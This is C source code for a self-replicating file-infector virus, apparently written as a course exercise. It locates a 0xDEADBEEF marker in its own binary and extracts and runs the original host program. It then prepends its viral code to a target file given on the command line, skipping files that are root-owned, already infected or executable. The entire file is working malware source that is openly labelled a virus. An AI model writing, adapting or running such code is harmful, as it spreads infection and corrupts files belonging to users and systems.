#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/wait.h>


//finds deadbeef and returns its position
int findDeadBeef(int fd)
{
    char buf[1] = "0";
    char comp = (char) 0xde; 
    int check = 0;
    int bytes = 0;

	if(fd ==-1)
	{
		printf("Bad FD\n");
	}
    while((bytes = read(fd, &buf, sizeof(char))) > 0)
    {
        if(buf[0] == comp)
        {
            if(check == 0)
            {
                check = 1;
                comp = (char) 0xad;
            }
            else if(check == 1)
            {
                check = 2;
                comp = (char) 0xbe;
            }
            else if(check == 2)
            {
                check = 3;
                comp = (char) 0xef;
            }
            else if(check == 3)
            {
                return lseek(fd, 0, SEEK_CUR);
            }
            else
            {
                check = 0;
                comp = (char) 0xde; 
            }
        }
        else
        {
            check = 0;
            comp = (char) 0xde; 
        }
    }
    return -1;
}

//stores the whole file into a big buffer
char* storeFileIntoBuffer(int fd,int fileSize)
{
	char * buf = malloc(fileSize*sizeof(char));
	if(fd != -1)
	{
		read(fd,buf,fileSize);
		return buf;
	}
printf("ERROR STORING\n");
free(buf);
return  "";
}

int main(int argc, char** argv)
{
    char buf[1] = "0";
    int fileSize = 0;
    int fileExists = 0;
    int fd = 0;
    int tmpfd = 0;
    int count = 0;
    int status = 0;
    int overflow = 0;
    int bytes =0;
    struct stat fileStat;
    struct stat argStat;
    char tmpPath [12] ;
    char* infectFile = NULL;
    char* virus = NULL;
    int infectFileSize=0;
    int i =0 ;
    char* args[argc+1];
    int  writingVirus = 0;
    off_t db;

    /* Copy host */
    lstat(argv[0], &fileStat);
    fileSize = fileStat.st_size;
    sprintf(tmpPath,"tmp/host.%d", getuid());
    fd = open(argv[0], O_RDONLY);
    tmpfd = open(tmpPath,O_WRONLY|O_CREAT, S_IXOTH|S_IXUSR|S_IXGRP);

    db = findDeadBeef(fd);


    if (db == -1)
    {
        printf("File not infected.\n");
    }

    while((bytes = read(fd,&buf,sizeof(char))) > 0)
    {
        if (count > fileSize)
        {
            printf("Exceeded File:\n");
            count = 0;
            overflow = -1;
        }
        count++;
        status = write(tmpfd,buf,sizeof(char));
        if (status == -1)
        {
            printf("Write Failed\n");
        } 
    }

    if (overflow == -1)
    {
        printf("Overflow: %d\n", count);
    }

    close(tmpfd);

    for(i=0;i<argc;i++)
	{
		args[i] = argv[i];
	}
		args[i+1] =NULL;

//execute the host
    if(fork() == 0)
    {
        execve(tmpPath, args, NULL);
        printf("Exec Failed: %s\n", tmpPath);
        exit(1);
    }
    else
    {
        wait(NULL);
    }

    virus = malloc(sizeof(char)*db);
    lseek(fd,0,SEEK_SET);
    virus = storeFileIntoBuffer(fd,db);
    close(fd);

    // Test if argv[1] exists
    fileExists = open(argv[1], O_CREAT|O_EXCL);

    if (fileExists != -1)
    {
        printf("File %s DNE.\n", argv[1]);
	free(virus);
        exit(1);
    }

    lstat(argv[1], &argStat);

//storing new host into buffer
    infectFileSize = argStat.st_size;
    infectFile = malloc(sizeof(char)*infectFileSize);
	

    // Check if owned by root
    if (argStat.st_uid == 0)
    {
        printf("File %s owned by Root.\n", argv[1]); 
	free(virus);
	free(infectFile);
        exit(1);
    }
//check if virus is able to write to the file
    if (!((argStat.st_mode & 0666)||(argStat.st_mode & 0066)||(argStat.st_mode & 0006)))
    {
        	printf("File %s permission denied.\n", argv[1]);
		free(virus);
		free(infectFile);
        	exit(1);
    }
//check execute bits
   if((argStat.st_mode & S_IXUSR)||(argStat.st_mode & S_IXGRP)||(argStat.st_mode & S_IXOTH))
	{
		printf("File has execute bits set\n");
		free(virus);
		free(infectFile);
		exit(1);
	}

    writingVirus = open(argv[1],O_RDWR);

//check if file is already infected
    if(findDeadBeef(writingVirus) !=-1)
	{
		printf("File already infected\n");
		free(virus);
		free(infectFile);
		close(writingVirus);
		exit(1);
	}

	lseek(writingVirus,0,SEEK_SET);
//write virus to file with dead beef
 	infectFile = storeFileIntoBuffer(writingVirus,infectFileSize);

	lseek(writingVirus,0,SEEK_SET);
	write(writingVirus,virus,db);

	free(virus);
//write host code back to file
	write(writingVirus,infectFile,infectFileSize);

	close(writingVirus);
	free(infectFile);
        exit(0);

}


